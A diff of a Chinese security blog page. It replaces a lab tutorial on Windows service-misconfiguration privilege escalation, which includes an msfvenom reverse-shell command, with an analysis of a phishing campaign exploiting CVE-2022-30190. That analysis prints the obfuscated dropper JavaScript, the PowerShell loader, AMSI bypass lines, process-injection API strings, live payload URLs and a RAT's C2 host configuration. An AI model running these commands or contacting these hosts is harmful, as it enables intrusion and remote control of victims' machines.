@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>windows配置错误导致的提权 | 九世的博客</title>
-  <meta name="keywords" content=" windows提权 ">
-  <meta name="description" content="windows配置错误导致的提权 | 九世的博客">
+  <title>某钓鱼邮件分析 | 九世的博客</title>
+  <meta name="keywords" content=" 恶意分析 ">
+  <meta name="description" content="某钓鱼邮件分析 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1982,9 +1982,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-windows配置错误导致的提权" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-某钓鱼邮件分析" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">windows配置错误导致的提权</h1>
+        <h1 class="article-title">某钓鱼邮件分析</h1>
     
     <div class="article-meta">
         
@@ -1993,14 +1993,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color5">windows提权</a>
+            <a href="javascript:" class="color5">恶意分析</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-08-26 16:50:15">2019-08-26 14:36</time>
+        创建时间:<time class="date" title="更新时间: 2023-08-07 15:30:40">2023-08-07 14:53</time>
         
     </div>
     <div class="article-meta">
@@ -2022,7 +2022,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#配置环境"><span class="toc-text">配置环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#常见的四种错误"><span class="toc-text">常见的四种错误</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#不带引号的服务路径"><span class="toc-text">不带引号的服务路径</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#弱文件夹权限"><span class="toc-text">弱文件夹权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#弱服务权限"><span class="toc-text">弱服务权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#注册表权限不足"><span class="toc-text">注册表权限不足</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#补充"><span class="toc-text">补充</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-text">参考链接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文"><span class="toc-text">正文</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -2037,113 +2037,250 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于管理员或用户对某些服务或权限设置错误，导致提权</p>
-<p><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1566811889993&amp;di=a7f8f8a7e0740867fcc2d63a33d95888&amp;imgtype=0&amp;src=http%3A%2F%2Fb-ssl.duitang.com%2Fuploads%2Fitem%2F201502%2F06%2F20150206172439_5PiSf.jpeg" alt=""></p>
-<h2 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h2><p>参考文章：<a href="https://amonsec.net/2018/09/23/Common-Windows-Misconfiguration-Services.html" target="_blank" rel="noopener">https://amonsec.net/2018/09/23/Common-Windows-Misconfiguration-Services.html</a></p>
-<p>首先先搭建对应的环境：</p>
-<pre><code>windows 10
-</code></pre><p>将以下保存为bat并以管理员权限执行</p>
-<pre><code class="bat">echo [*] Create user lowuser
-net user lowuser lowuser1234 /add
-echo [*] Create directories for the binaryPath of our services
-mkdir &quot;C:\WeakServices\Weak Service 1&quot;
-mkdir &quot;C:\WeakServices\WeakService2&quot;
-mkdir &quot;C:\WeakServices\WeakService3&quot;
-mkdir &quot;C:\WeakServices\WeakService4&quot;
-echo [*] Use a default binary
-copy C:\Windows\System32\snmptrap.exe &quot;C:\WeakServices\Weak Service 1\service1.exe&quot;
-copy C:\Windows\System32\snmptrap.exe &quot;C:\WeakServices\WeakService2\service2.exe&quot;
-copy C:\Windows\System32\snmptrap.exe &quot;C:\WeakServices\WeakService3\service3.exe&quot;
-copy C:\Windows\System32\snmptrap.exe &quot;C:\WeakServices\WeakService4\service4.exe&quot;
-echo [*] settings 权
-icacls &quot;C:\WeakServices\Weak Service 1&quot; /deny lowuser:M
-icacls &quot;C:\WeakServices\WeakService3&quot; /deny lowuser:M
-icacls &quot;C:\WeakServices\WeakService4&quot; /deny lowuser:M
-echo [*] 四服务
-sc create WeakService1 displayName= &quot;Unquoted Service Path&quot; binPath= &quot;C:\WeakServices\Weak Service 1\service1.exe&quot; start= auto
-sc create WeakService2 displayName= &quot;Weak Folder Permissions&quot; binPath= &quot;C:\WeakServices\WeakService2\service2.exe&quot; start= auto
-sc create WeakService3 displayName= &quot;Weak Service Permissions&quot; binPath= &quot;C:\WeakServices\WeakService3\service3.exe&quot; obj= .\lowuser password= lowuser1234 start= auto
-sc create WeakService4 displayName= &quot;Weak Registry Permissions&quot; binPath= &quot;C:\WeakServices\WeakService4\service4.exe&quot; start= demand
-echo [*] Modifying WeakService3&#39;s permissions
-sc sdset WeakService3 &quot;D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;DCLCSWRPWPDTLOCRSDRCWDWO;;;WD)&quot;
-</code></pre>
-<p>创建完成后会有一个lowsuer用户，以及对应的服务</p>
-<p><img src="https://s2.ax1x.com/2019/08/26/mWfGnJ.png" alt="éç½®ç¯å¢"></p>
-<p>创建完成</p>
-<p><img src="https://s2.ax1x.com/2019/08/26/mWfw9K.png" alt="éç½®å®æ"></p>
-<h2 id="常见的四种错误"><a href="#常见的四种错误" class="headerlink" title="常见的四种错误"></a>常见的四种错误</h2><ul>
-<li>不带引号的服务路径</li>
-<li>弱文件夹权限</li>
-<li>弱服务权限</li>
-<li>注册表权限不足</li>
-</ul>
-<p>利用的要求是：服务是系统启动时自启动的,服务的权限为高权用户</p>
-<p>推荐利用手法：生成一个执行创建Administrator用户的exe，推测应该执行服务就断了所以反弹meterpreter那些不可取，下面会说到</p>
-<h2 id="不带引号的服务路径"><a href="#不带引号的服务路径" class="headerlink" title="不带引号的服务路径"></a>不带引号的服务路径</h2><p>执行wmic命令来过滤出不带引号的服务路径</p>
-<pre><code class="cmd">wmic service get name,displayname,startmode,pathname | findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;
-</code></pre>
-<p><img src="https://s2.ax1x.com/2019/08/26/mWhNrQ.png" alt="ä¸å¸¦å¼å·çæå¡è·¯å¾"></p>
-<p>使用sc查看对应的服务</p>
-<p>PS:AUTO_START是系统启动将自启动该服务的意思</p>
-<pre><code>sc qc [servicename]
-</code></pre><p><img src="https://s2.ax1x.com/2019/08/26/mWhtKg.png" alt="æå¡è·¯å¾"></p>
-<p>查看BINARY_PATH_NAME第一个父文件夹的权限</p>
-<pre><code>icacls [path]
-</code></pre><p><img src="https://s2.ax1x.com/2019/08/26/mWhjII.png" alt="æä»¶å¤¹æé"></p>
-<p>可以从图中得到如下信息：</p>
-<pre><code>所有者:NT AUTHORITY\SYSTEM
-可操作的用户组:NT AUTHORITY\Authenticated Users (所有用户的意思)
-</code></pre><p>根据文章中说的带引号的文件寻找方法和不带引号的文件寻找方法：</p>
-<p><img src="https://s2.ax1x.com/2019/08/26/mW4KQU.png" alt="image"></p>
-<p>然后使用msfvenom创建一个exe，改名为Weak.exe放入C:WeakServices\Weak.exe</p>
-<pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=xxx LPORT=xxx -f exe &gt; Weak.exe
-</code></pre><p>这里可能就有人问了，如果文件名没空格呢？比如C:lbw\Fuckyou\nm.exe那么就在lbw文件夹下创建</p>
-<p>一个名为Fuckyou.exe，然后把Fuckyou文件夹给改名</p>
-<p>由于低权用户无法重启服务，但是可以通过重启系统来让服务重新执行。重启之后将执行C:WeakServices\Weak.exe,为什么呢？因为在寻找二进制过程中，当发现由exe结尾的就会认为是对应服务的二进制文件，导致滥用</p>
-<p>重启windows</p>
-<p><img src="https://s2.ax1x.com/2019/08/26/mW5R41.md.png" alt="éå¯"></p>
-<p>在登录界面短暂的获取到meterpreter，我不清楚这里是windows10的问题还是什么原因，过了一段时间就会掉了</p>
-<p><img src="https://s2.ax1x.com/2019/08/26/mW5UNn.png" alt="åå¼¹meterpreter"></p>
-<p>不知道什么原因？</p>
-<p><img src="https://s2.ax1x.com/2019/08/26/mW5j8P.png" alt="ä¸ç¥éä»ä¹åå "></p>
-<p>这是GIF示例</p>
-<p><img src="https://s2.ax1x.com/2019/08/26/mWovnS.gif" alt="GIF"></p>
-<p>system权限图</p>
-<p><img src="https://s2.ax1x.com/2019/08/26/mWqsRs.png" alt="image"></p>
-<h2 id="弱文件夹权限"><a href="#弱文件夹权限" class="headerlink" title="弱文件夹权限"></a>弱文件夹权限</h2><p>这里用WeaKService2做示例</p>
-<p><img src="https://s2.ax1x.com/2019/08/26/mWoQOS.png" alt="image"></p>
-<p>第一步寻找允许任意用户修改的服务，并且权限是高权用户所执行的（补充有说明）</p>
-<p><img src="https://s2.ax1x.com/2019/08/26/mWTL59.png" alt="image"></p>
-<p>得到所有用户都可以访问的结果后，生成一个exe将其改名为服务启动的exe替换。并长重启系统，这里用calc做例子</p>
-<p><img src="https://s2.ax1x.com/2019/08/26/mW7fde.png" alt="image"></p>
-<p>或者你直接把存放服务指定二进制的文件夹给改名了，自己在创建服务指定的二进制文件的文件夹。这里就是新建一个WeakServices2文件夹</p>
-<p><img src="https://s2.ax1x.com/2019/08/26/mWLuSs.png" alt="image"></p>
-<p>重启GIF</p>
-<p><img src="https://s2.ax1x.com/2019/08/26/mWLI78.gif" alt="GIF"></p>
-<h2 id="弱服务权限"><a href="#弱服务权限" class="headerlink" title="弱服务权限"></a>弱服务权限</h2><p>用WeakService3来做示例(<img src="https://s2.ax1x.com/2019/08/26/mfuxzj.png" alt="1566806147207"></p>
-<p>这里要用到一个工具来查看服务的权限，accesschk，下载地址：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/accesschk" target="_blank" rel="noopener">accesschk</a></p>
-<p>执行accesschk -cv [service name]</p>
-<p><img src="https://s2.ax1x.com/2019/08/26/mWx8JS.png" alt="image"></p>
-<p>允许Everyone设置服务任何操作，那么通过修改服务的BINARY_PATH_NAME,并重启该服务即可提升权限。这里将BINARY_PATH_NAME设置为如下路径</p>
-<p><img src="https://s2.ax1x.com/2019/08/26/mWzR1g.png" alt="image"></p>
-<p>动态GIF</p>
-<p><img src="https://s2.ax1x.com/2019/08/26/mfS1gg.gif" alt="GIF"></p>
-<h2 id="注册表权限不足"><a href="#注册表权限不足" class="headerlink" title="注册表权限不足"></a>注册表权限不足</h2><p>错误配置的服务注册表项，注册表路径HKLM\SYSTEM\CurrentControlSet\Services\&lt;service_name&gt;</p>
-<p>存放着对应的服务设置</p>
-<p><img src="https://s2.ax1x.com/2019/08/26/mfp8JK.md.png" alt="image"></p>
-<p>使用accesschk检查注册表的权限</p>
-<p>执行<code>accesschk -kvw [regedit path]</code></p>
-<p><img src="https://s2.ax1x.com/2019/08/26/mfFyrD.png" alt="image"></p>
-<p>我这里查询不到，但是文章是可以查的到的。不过没关系，直接手动打开注册表对服务的ImagePath进行修改，如果修改成功的话就代表有权限。否则就没有</p>
-<p>修改前：</p>
-<p><img src="https://s2.ax1x.com/2019/08/26/mfF4RP.md.png" alt="image"></p>
-<p>（好吧，不是accesschk 的错，的确没有权限，那么这里就不弄了。可以自己看参考文章）</p>
-<p><img src="https://s2.ax1x.com/2019/08/26/mfFTsS.md.png" alt="image"></p>
-<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>寻找弱文件夹权限和弱服务权限使用到的操作是使用：accesschk64.exe -cv *</p>
-<p>获取所有服务，然后搜索关键字:RW Everyone，挑选高权的服务</p>
-<p><img src="https://s2.ax1x.com/2019/08/26/mfE9UJ.png" alt="image"></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>当exp提权不下的时候，可以尝试寻找这些错误的配置。来提升自己的权限</p>
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>划水摆烂分析点东西</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.securonix.com/blog/securonix-threat-labs-security-meme4chan-advisory/" target="_blank" rel="noopener">https://www.securonix.com/blog/securonix-threat-labs-security-meme4chan-advisory/</a></p>
+<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>在线沙箱:<br><a href="https://app.any.run/tasks/33363f16-8146-4bef-948b-362ec2cb0f6d/" target="_blank" rel="noopener">https://app.any.run/tasks/33363f16-8146-4bef-948b-362ec2cb0f6d/</a><br><a href="https://www.joesandbox.com/analysis/1284837/1/html" target="_blank" rel="noopener">https://www.joesandbox.com/analysis/1284837/1/html</a></p>
+<p>CVE-2022-30190利用<br>（远程链接）<br><a href="https://huskidkifklaoksikfkfijsju.blogspot.com/atom.xml" target="_blank" rel="noopener">https://huskidkifklaoksikfkfijsju.blogspot.com/atom.xml</a> #已404<br><a href="https://73cceb63-7ecd-45e2-9eab-f8d98aab177f.usrfiles.com/ugd/73cceb_b5b6005e2aa74cf48cd55dca1a2ff093.docx" target="_blank" rel="noopener">https://73cceb63-7ecd-45e2-9eab-f8d98aab177f.usrfiles.com/ugd/73cceb_b5b6005e2aa74cf48cd55dca1a2ff093.docx</a><br><img src="https://s1.ax1x.com/2023/08/07/pPEBdnH.png" alt=""></p>
+<p><img src="https://s1.ax1x.com/2023/08/07/pPEBDAI.png" alt=""></p>
+<p>从分析文找到远程加载的payload<br><img src="https://s1.ax1x.com/2023/08/07/pPEB69f.png" alt=""></p>
+<pre><code>http://73cceb63-7ecd-45e2-9eab-f8d98aab177f.usrfiles.com/ugd/73cceb_e5a698286daf43ac87b4544a35b1a482.txt
+</code></pre><p>可以看到有几个混淆的变量</p>
+<pre><code>$X1
+$colabber
+$Hetmosphyre
+$X2
+</code></pre><p><strong>阶段一</strong></p>
+<pre><code>-&gt; 运行winword
+ -&gt;延迟3秒
+ -&gt; 删除C:\Users\*\Downloads\下的所有.docx文件
+ -&gt; 删除C:\Users\*\Desktop\下的所有.docx文件
+ -&gt; 创建C:\ProgramData\MinMinons
+ -&gt;将$Gamilopera写入C:\ProgramData\MinMinons\Candlegraphy.~___~
+-&gt;IEX运行$Gamilopera变量
+</code></pre><p><img src="https://s1.ax1x.com/2023/08/07/pPEBhHs.png" alt=""></p>
+<pre><code>$X1
+-&gt;js内容三层hex解密
+        -&gt;js内容写入到C:\ProgramData\MinMinons\Microsoftupdate.js
+        -&gt;创建计划任务运行js schtasks /create /sc MINUTE /mo 180 /tn MOperaChrome /F /tr C:\ProgramData\MinMinons\Microsoftupdate.js
+        js阶段:
+            -&gt;ActiveXObject组件通过CLSID:{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}实例化wscript.Shell
+            -&gt;延迟3秒
+            -&gt;要运行的命令替换运行powershell-&gt; powershell -EP Bypass -c Get-Content -RAW C:\ProgramData\MinMinons\Candlegraphy.~___~ | .(&#39;{x}{9}&#39;.replace(&#39;9&#39;,&#39;0&#39;).replace(&#39;x&#39;,&#39;1&#39;)-f&#39;GIMGUL&#39;,&#39;%%&#39;).replace(&#39;%%&#39;,&#39;I&#39;).replace(&#39;GIMGUL&#39;,&#39;EX&#39;) | ping 127.0.0.1
+</code></pre><p><img src="https://s1.ax1x.com/2023/08/07/pPEDS4x.png" alt=""></p>
+<p>C:\ProgramData\MinMinons\Microsoftupdate.js</p>
+<pre><code>var  _0x3195=[&quot;\x6E\x65\x77\x3A\x7B\x46\x39\x33\x35\x44\x43\x32\x32\x2D\x31\x43\x46\x30\x2D\x31\x31\x44\x30\x2D\x41\x44\x42\x39\x2D\x30\x30\x43\x30\x34\x46\x44\x35\x38\x41\x30\x42\x7D&quot;,&quot;\x53\x6C\x65\x65\x70&quot;,&quot;\x70\x6F\x77\x65\x72\x73\x68\x2A\x5E\x20\x2D\x45\x50\x20\x42\x79\x70\x61\x73\x73\x20\x2D\x63\x20\x47\x65\x74\x2D\x43\x6F\x6E\x74\x65\x6E\x74\x20\x2D\x52\x41\x57\x20\x43\x3A\x5C\x50\x72\x6F\x67\x72\x61\x6D\x44\x61\x74\x61\x5C\x4D\x69\x6E\x4D\x69\x6E\x6F\x6E\x73\x5C\x43\x61\x6E\x64\x6C\x2A\x67\x72\x61\x70\x68\x79\x2E\x7E\x5F\x5F\x5F\x7E\x20\x7C\x20\x2E\x28\x27\x7B\x78\x7D\x7B\x39\x7D\x27\x2E\x72\x65\x70\x6C\x61\x63\x65\x28\x27\x39\x27\x2C\x27\x30\x27\x29\x2E\x72\x65\x70\x6C\x61\x63\x65\x28\x27\x78\x27\x2C\x27\x31\x27\x29\x2D\x66\x27\x47\x49\x4D\x47\x55\x4C\x27\x2C\x27\x25\x25\x27\x29\x2E\x72\x65\x70\x6C\x61\x63\x65\x28\x27\x25\x25\x27\x2C\x27\x49\x27\x29\x2E\x72\x65\x70\x6C\x61\x63\x65\x28\x27\x47\x49\x4D\x47\x55\x4C\x27\x2C\x27\x45\x58\x27\x29\x20\x7C\x20\x70\x69\x6E\x67\x20\x31\x32\x37\x2E\x30\x2E\x30\x2E\x31&quot;,&quot;\x2A&quot;,&quot;\x65&quot;,&quot;\x72\x65\x70\x6C\x61\x63\x65&quot;,&quot;\x5E&quot;,&quot;\x6C\x6C&quot;,&quot;\x52\x75\x6E&quot;];/*new:{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}Sleeppowersh*^ -EP Bypass -c Get-Content -RAW C:\ProgramData\MinMinons\Candl*graphy.~___~ |  .(&#39;{x}{9}&#39;.replace(&#39;9&#39;,&#39;0&#39;).replace(&#39;x&#39;,&#39;1&#39;)-f&#39;GIMGUL&#39;,&#39;%%&#39;).replace(&#39;%%&#39;,&#39;I&#39;).replace(&#39;GIMGUL&#39;,&#39;EX&#39;) | ping 127.0.0.1*ereplace^llRun*/combackmyex= ActiveXObject(_0x3195[0]); //new:{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}WScript[_0x3195[1]](3000); //延??时???3秒? Sleep(3000)Jigijigi= _0x3195[2]; //powersh*^ -EP Bypass -c Get-Content -RAW  C:\ProgramData\MinMinons\Candl*graphy.~___~ |  .(&#39;{x}{9}&#39;.replace(&#39;9&#39;,&#39;0&#39;).replace(&#39;x&#39;,&#39;1&#39;)-f&#39;GIMGUL&#39;,&#39;%%&#39;).replace(&#39;%%&#39;,&#39;I&#39;).replace(&#39;GIMGUL&#39;,&#39;EX&#39;) | ping 127.0.0.1Jigijigi= Jigijigi[_0x3195[5]](_0x3195[3],_0x3195[4]); //replace * eJigijigi= Jigijigi[_0x3195[5]](_0x3195[3],_0x3195[4]); //replace * eJigijigi= Jigijigi[_0x3195[5]](_0x3195[3],_0x3195[4]); //replace * eJigijigi= Jigijigi[_0x3195[5]](_0x3195[3],_0x3195[4]); //replace * eJigijigi= Jigijigi[_0x3195[5]](_0x3195[6],_0x3195[7]); //replace ^ ll -&gt; powershell -EP  Bypass -c Get-Content -RAW C:\ProgramData\MinMinons\Candlegraphy.~___~ |  .(&#39;{x}{9}&#39;.replace(&#39;9&#39;,&#39;0&#39;).replace(&#39;x&#39;,&#39;1&#39;)-f&#39;GIMGUL&#39;,&#39;%%&#39;).replace(&#39;%%&#39;,&#39;I&#39;).replace(&#39;GIMGUL&#39;,&#39;EX&#39;) | ping 127.0.0.1combackmyex[_0x3195[8]](Jigijigi,0,true) //Run 运?行Dpowershell
+</code></pre><p>C:\ProgramData\MinMinons\Candlegraphy.~___~<br><img src="https://s1.ax1x.com/2023/08/07/pPEDIqH.png" alt=""></p>
+<p><strong>阶段2</strong><br>$colabber<br>$Hetmosphyre<br>实现的功能</p>
+<pre><code>-&gt; [Ref].Assembly.GetType(&#39;System.Management.Automation.AmsiUtils&#39;).GetField(&#39;amsiInitFailed&#39;,&#39;NonPublic,Static&#39;).SetValue($null,$true) AMSI绕过
+        -&gt; 注册表设置COM口劫持amsi绕过 &#39;HKCU:\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32&#39; -N &#39;(Default)&#39; -V &quot;C:\IDontExist.dll&quot;
+        -&gt;解密两个.NET的PE，分别赋值变量$Ripple - 2.4.dll 和$$Ripple - chas.exe
+        -&gt;$Ripple .NET内存加载 2.4.dll nanamespace:A class:B Method:C
+            -&gt;A.B.C(&quot;C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe&quot;,[OBJECT[]]$Ripple)
+            -&gt;A.B.C(&quot;C:\Windows\Microsoft.NET\Framework\v2.0.50727\RegSvcs.exe&quot;,[OBJECT[]]$Ripple)
+            -&gt;A.B.C(&quot;C:\Windows\Microsoft.NET\Framework\v3.5\Msbuild.exe&quot;,[OBJECT[]]$Ripple)
+            内存加载实现将chas.exe进程注入到RegSvcs.exe和Msbuild.exe
+</code></pre><p><img src="https://s1.ax1x.com/2023/08/07/pPEDzLQ.png" alt=""></p>
+<pre><code>* 2.4.dll - 傀儡进程
+* chas.exe - C2
+</code></pre><p>DLL是用de4ot混淆过的<br><img src="https://s1.ax1x.com/2023/08/07/pPEr9ds.png" alt=""><br><img src="https://s1.ax1x.com/2023/08/07/pPErCon.png" alt=""></p>
+<p>2.4.DLL<br><img src="https://s1.ax1x.com/2023/08/07/pPErFJ0.png" alt=""><br><img src="https://i.miji.bid/2023/08/07/df1df47780927aec30f7c355c3bf66a4.png" alt=""><br><img src="https://i.miji.bid/2023/08/07/836e42a880d48050217ddc307c33f7cc.png" alt=""></p>
+<p>去混淆</p>
+<pre><code>        public static string smethod_0(string string_11)
+        {
+            StringBuilder stringBuilder = new StringBuilder();
+            for (int i = 0; i &lt; string_11.Length; i += 2)
+            {
+                int value = Convert.ToInt32(string_11.Substring(i, 2), 16);
+                stringBuilder.Append(Convert.ToChar(value));
+            }
+            return stringBuilder.ToString();
+        }
+        public static string ReverseString(string s)
+        {
+            char[] array = s.ToCharArray();
+            Array.Reverse(array);
+            return new string(array);
+        }
+</code></pre><pre><code>    // Token: 0x04000001 RID: 1
+        private static string string_0 = B.smethod_0(B.ReverseString(&quot;2333C656E62756B6&quot;)); //Kernel32
 
+        // Token: 0x04000002 RID: 2
+        private static string string_1 = B.smethod_0(B.ReverseString(&quot;46165627864556D657375625&quot;)); //ResumeThread
+
+        // Token: 0x04000003 RID: 3
+        private static string string_2 = B.smethod_0(&quot;576F77363&lt;?&gt;53657&lt;?&gt;5&lt;?&gt;687265616&lt;?&gt;&lt;?&gt;36F6E7&lt;?&gt;65787&lt;?&gt;&quot;.Replace(&quot;&lt;?&gt;&quot;, &quot;4&quot;)); //Wow64SetThreadContext
+
+        // Token: 0x04000004 RID: 4
+        private static string string_3 = B.smethod_0(B.ReverseString(&quot;47875647E6F634461656278645475635&quot;)); //SetThreadContext
+
+        // Token: 0x04000005 RID: 5
+        private static string string_4 = B.smethod_0(&quot;57?F773?3447?57454?872?5?1?443?F?E74?57874&quot;.Replace(&quot;?&quot;, &quot;6&quot;)); //Wow64GetThreadContext
+
+        // Token: 0x04000006 RID: 6
+        private static string string_5 = B.smethod_0(B.ReverseString(&quot;47875647E6F634461656278645475674&quot;)); //GetThreadContext
+
+        // Token: 0x04000007 RID: 7
+        private static string string_6 = B.smethod_0(&quot;5??9727475?1?C41?C?C?F?34578&quot;.Replace(&quot;?&quot;, &quot;6&quot;)); //VirtualAllocEx
+
+        // Token: 0x04000008 RID: 8
+        private static string string_7 = B.smethod_0(B.ReverseString(&quot;9727F6D656D437375636F627055647962775&quot;)); //WriteProcessMemory
+
+        // Token: 0x04000009 RID: 9
+        private static string string_8 = B.smethod_0(&quot;5265616450?26F6365?3?34D656D6F?2?9&quot;.Replace(&quot;?&quot;, &quot;7&quot;)); //ReadProcessMemory
+
+        // Token: 0x0400000A RID: 10
+        private static string string_9 = B.smethod_0(B.ReverseString(&quot;E6F6964736563566F4775696650716D6E65577A5&quot;)); //ZwUnmapViewOfSection
+
+        // Token: 0x0400000B RID: 11
+        private static string string_10 = B.smethod_0(&quot;4372?5?174?55072?F?3?5737341&quot;.Replace(&quot;?&quot;, &quot;6&quot;)); //CreateProcessA
+
+        // Token: 0x0400000C RID: 12
+        private static readonly B.Delegate0 delegate0_0 = B.smethod_1&lt;B.Delegate0&gt;(B.string_0, B.string_1);
+
+        // Token: 0x0400000D RID: 13
+        private static readonly B.Delegate1 delegate1_0 = B.smethod_1&lt;B.Delegate1&gt;(B.string_0, B.string_2);
+
+        // Token: 0x0400000E RID: 14
+        private static readonly B.Delegate2 delegate2_0 = B.smethod_1&lt;B.Delegate2&gt;(B.string_0, B.string_3);
+
+        // Token: 0x0400000F RID: 15
+        private static readonly B.Delegate3 delegate3_0 = B.smethod_1&lt;B.Delegate3&gt;(B.string_0, B.string_4);
+
+        // Token: 0x04000010 RID: 16
+        private static readonly B.Delegate4 delegate4_0 = B.smethod_1&lt;B.Delegate4&gt;(B.string_0, B.string_5);
+
+        // Token: 0x04000011 RID: 17
+        private static readonly B.Delegate5 delegate5_0 = B.smethod_1&lt;B.Delegate5&gt;(B.string_0, B.string_6);
+
+        // Token: 0x04000012 RID: 18
+        private static readonly B.Delegate6 delegate6_0 = B.smethod_1&lt;B.Delegate6&gt;(B.string_0, B.string_7);
+
+        // Token: 0x04000013 RID: 19
+        private static readonly B.Delegate7 delegate7_0 = B.smethod_1&lt;B.Delegate7&gt;(B.string_0, B.string_8);
+
+        // Token: 0x04000014 RID: 20
+        private static readonly B.Delegate8 delegate8_0 = B.smethod_1&lt;B.Delegate8&gt;(B.smethod_0(&quot;6E74646C6C&quot;), B.string_9);
+
+        // Token: 0x04000015 RID: 21
+        private static readonly B.Delegate9 delegate9_0 = B.smethod_1&lt;B.Delegate9&gt;(B.string_0, B.string_10);
+</code></pre><p>chas.exe<br>创建互斥体，线程随机延时。接收socket回包执行对应的功能<br><img src="https://i.miji.bid/2023/08/07/2496b987750dc9814579b195f2eaadc9.png" alt=""><br><img src="https://i.miji.bid/2023/08/07/440cea9821448965fc73385b936496cb.png" alt=""><br><img src="https://i.miji.bid/2023/08/07/8c5934f0b07e2222a44dd6e54b541ec1.png" alt=""></p>
+<p>C2配置</p>
+<pre><code>namespace Stub
+{
+    // Token: 0x02000007 RID: 7
+    public class Settings
+    {
+        // Token: 0x04000006 RID: 6
+        public static string Host = &quot;stanthely2023.duckdns.org&quot;;
+
+        // Token: 0x04000007 RID: 7
+        public static string Port = &quot;7000&quot;;
+
+        // Token: 0x04000008 RID: 8
+        public static string KEY = &quot;&lt;123456789&gt;&quot;;
+
+        // Token: 0x04000009 RID: 9
+        public static string SPL = &quot;&lt;Xwormmm&gt;&quot;;
+
+        // Token: 0x0400000A RID: 10
+        public static string USBNM = &quot;USB.exe&quot;;
+
+        // Token: 0x0400000B RID: 11
+        public static readonly string Mutexx = &quot;tddITwpC5yRaJiTI&quot;;
+
+        // Token: 0x0400000C RID: 12
+        public static Mutex _appMutex;
+
+        // Token: 0x0400000D RID: 13
+        public static bool usbC;
+
+        // Token: 0x0400000E RID: 14
+        public static string current = Process.GetCurrentProcess().MainModule.FileName;
+    }
+</code></pre><p>通讯使用AES加密<br><img src="https://i.miji.bid/2023/08/07/0ebfc30b0ca07191655dbd1667f80e36.png" alt=""></p>
+<p>C2功能：<br>|function|note|<br>|——–|—-|<br>|Ping|心跳包功能|<br>|Info|获取被控主机详细信息|<br>|admin|判断是否为管理员|<br>|Antivirus|枚举杀毒|<br>|STDos|DDOS|<br>|Plugin|动态加载.NET|<br>|Download|下载者|<br>|getDrives|枚举盘符/USB|<br>|getFiles|获取文件信息|<br>|getFolders|遍历文件夹|</p>
+<p><img src="https://i.miji.bid/2023/08/07/88977dc504340d8fe6a4e1ef632510f4.png" alt=""></p>
+<p>$DEP</p>
+<pre><code>-&gt;  注册表设置COM口劫持amsi绕过 &#39;HKCU:\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32&#39; -N &#39;(Default)&#39; -V &quot;C:\IDontExist.dll&quot;
